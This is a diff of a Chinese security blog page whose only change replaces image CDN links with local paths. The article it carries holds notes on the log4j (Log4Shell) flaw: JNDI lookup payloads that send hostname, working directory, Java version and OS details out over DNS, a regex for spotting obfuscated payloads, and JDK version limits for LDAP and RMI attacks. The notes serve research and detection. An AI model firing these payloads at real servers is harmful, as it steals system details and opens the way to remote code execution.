@@ -20,20 +20,20 @@
 <meta property="og:url" content="0sec.com.cn/2021-12-14/index.html">
 <meta property="og:site_name" content="Cosmic Fragments">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://0blog.test.upcdn.net/20211227003904.png">
-<meta property="og:image" content="http://0blog.test.upcdn.net/20211215153345.png">
-<meta property="og:image" content="http://0blog.test.upcdn.net/20211215153138.png">
-<meta property="og:image" content="http://0blog.test.upcdn.net/20211215195741.png">
-<meta property="og:image" content="http://0blog.test.upcdn.net/20211215181823.png">
-<meta property="og:image" content="http://0blog.test.upcdn.net/20211215203458.png">
-<meta property="og:image" content="http://0blog.test.upcdn.net/20211215014228.jpg">
-<meta property="og:image" content="http://0blog.test.upcdn.net/20211215181338.png">
-<meta property="og:image" content="http://0blog.test.upcdn.net/20211215164239.png">
-<meta property="og:image" content="http://0blog.test.upcdn.net/20211224131635.png">
-<meta property="og:updated_time" content="2021-12-26T16:39:57.724Z">
+<meta property="og:image" content="/img/20211227003904.png">
+<meta property="og:image" content="/img/20211215153345.png">
+<meta property="og:image" content="/img/20211215153138.png">
+<meta property="og:image" content="/img/20211215195741.png">
+<meta property="og:image" content="/img/20211215181823.png">
+<meta property="og:image" content="/img/20211215203458.png">
+<meta property="og:image" content="/img/20211215014228.jpg">
+<meta property="og:image" content="/img/20211215181338.png">
+<meta property="og:image" content="/img/20211215164239.png">
+<meta property="og:image" content="/img/20211224131635.png">
+<meta property="og:updated_time" content="2024-05-29T07:00:57.567Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="关于log4j、log4shell的一些记录">
-<meta name="twitter:image" content="http://0blog.test.upcdn.net/20211227003904.png">
+<meta name="twitter:image" content="/img/20211227003904.png">
 
 <link rel="apple-touch-icon" href="/apple-touch-icon.png">
 
@@ -260,43 +260,43 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p><img src="http://0blog.test.upcdn.net/20211227003904.png" alt><br><a id="more"></a></p>
+        <p><img src="/img/20211227003904.png" alt><br><a id="more"></a></p>
 <h2 id="无法外带敏感数据问题"><a href="#无法外带敏感数据问题" class="headerlink" title="无法外带敏感数据问题"></a>无法外带敏感数据问题</h2><p>通过DNSLOG外带敏感信息时，使用子域名形式会有一部分信息带不出来。比如我在下面分别拼接了四个payload：</p>
 <pre><code>${hostName}
 ${sys:user.dir}
 ${sys:java.version}
 ${java:os}}
 </code></pre><p>位置如图：</p>
-<p><img src="http://0blog.test.upcdn.net/20211215153345.png" alt></p>
+<p><img src="/img/20211215153345.png" alt></p>
 <p>结果是只有<code>hostname</code>和<code>java.version</code>外带出了信息：</p>
-<p><img src="http://0blog.test.upcdn.net/20211215153138.png" alt></p>
+<p><img src="/img/20211215153138.png" alt></p>
 <p>带不出来的原因是返回的结果中会有一些特殊字符如空格，导致jndi lookup抛出NamingException:</p>
-<p><img src="http://0blog.test.upcdn.net/20211215195741.png" alt></p>
+<p><img src="/img/20211215195741.png" alt></p>
 <p>所以更好的方法是通过dns外带，监听UDP端口，并将变量名拼接在url之后：</p>
 <pre><code>${jndi:dns://127.0.0.1:6666/${hostName} -${sys:user.dir}- ${sys:java.version} - ${java:os}}
 </code></pre><p>如图可以外带敏感信息：</p>
-<p><img src="http://0blog.test.upcdn.net/20211215181823.png" alt></p>
+<p><img src="/img/20211215181823.png" alt></p>
 <p>那么这些<code>{}</code>究竟是什么变量，以及其他还可以外带哪些敏感信息呢，这个我也找了一下。<a href="https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg" target="_blank" rel="noopener">log4j 漏洞一些特殊的利用方式</a>这篇文章提到了<code>System.getProperty()</code>和<code>System.getenv()</code>以及Bundle，但我本地打印了一下发现并不是<code>${sys:java.version}</code>这样的key-value对，应该是log4j从这些属性中读出信息后自己进行了处理，这个有待debug跟一下。</p>
 <p>另外浅蓝师傅还在文章中提到了<code>ResourceBundle</code>加载.properties 配置文件，导致可以读配置项信息的问题：</p>
-<p><img src="http://0blog.test.upcdn.net/20211215203458.png" alt></p>
+<p><img src="/img/20211215203458.png" alt></p>
 <h2 id="好用的正则表达式"><a href="#好用的正则表达式" class="headerlink" title="好用的正则表达式"></a>好用的正则表达式</h2><p>Twitter上@egglessness老哥分享的正则：</p>
 <pre><code>\${(\${(.*?:|.*?:.*?:-)(&#39;|&quot;|`)*(?1)}*|[jndi:lapsrm](&#39;|&quot;|`)*}*){9,11}
 </code></pre><p>我用regexr测试了一下，前缀是都能匹配上的，即使进行了大小写或者随机符号混淆：</p>
-<p><img src="http://0blog.test.upcdn.net/20211215014228.jpg" alt></p>
+<p><img src="/img/20211215014228.jpg" alt></p>
 <p>可以从这里调试一下：</p>
 <p><a href="https://regex101.com/r/bImUQl/1" target="_blank" rel="noopener">https://regex101.com/r/bImUQl/1</a></p>
 <p>我匹配的payload是使用<a href="https://github.com/woodpecker-framework/woodpecker-framwork-release" target="_blank" rel="noopener">woodpecker框架</a>加载<a href="https://github.com/woodpecker-appstore/log4j-payload-generator" target="_blank" rel="noopener">此payload插件</a>生成的：</p>
-<p><img src="http://0blog.test.upcdn.net/20211215181338.png" alt></p>
+<p><img src="/img/20211215181338.png" alt></p>
 <p>可以帮助进行大小写混淆和随机符号混淆。</p>
 <h2 id="ElasticSearch中的log4j版本受影响但无法RCE"><a href="#ElasticSearch中的log4j版本受影响但无法RCE" class="headerlink" title="ElasticSearch中的log4j版本受影响但无法RCE"></a>ElasticSearch中的log4j版本受影响但无法RCE</h2><blockquote>
 <p>偷师P牛</p>
 </blockquote>
 <p>创建的index名中带payload时会写进日志，经由log4j处理，但是ES对index的名字有一些限制，无法使用特殊字符：</p>
-<p><img src="http://0blog.test.upcdn.net/20211215164239.png" alt></p>
+<p><img src="/img/20211215164239.png" alt></p>
 <p>template index可以使用payload触发jndi lookup，但是由于ES使用了Security Manager安全机制来防御文件操作和Socket操作，所以无法正常连接远程服务器，也就无法实现RCE。只能用DNS外带一些敏感信息了。</p>
 <h2 id="利用RMI攻击要求jdk版本更低"><a href="#利用RMI攻击要求jdk版本更低" class="headerlink" title="利用RMI攻击要求jdk版本更低"></a>利用RMI攻击要求jdk版本更低</h2><p>LDAP协议攻击Log4j要求jdk版本低于8u191，RMI协议攻击要求jdk版本低于8u121。都是针对被攻击端的jdk版本要求。</p>
 <p>我的jdk版本为8u181，默认情况下，还可以指定URI为LDAP协议来进行JNDI注入攻击，但RMI和CORBA已被禁止使用远程codebase。主动开启选项<code>System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;);</code>才可以利用成功：</p>
-<p><img src="http://0blog.test.upcdn.net/20211224131635.png" alt></p>
+<p><img src="/img/20211224131635.png" alt></p>
 <blockquote>
 <p>JDK 6u45、7u21之后：java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</p>
 <p>JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。</p>
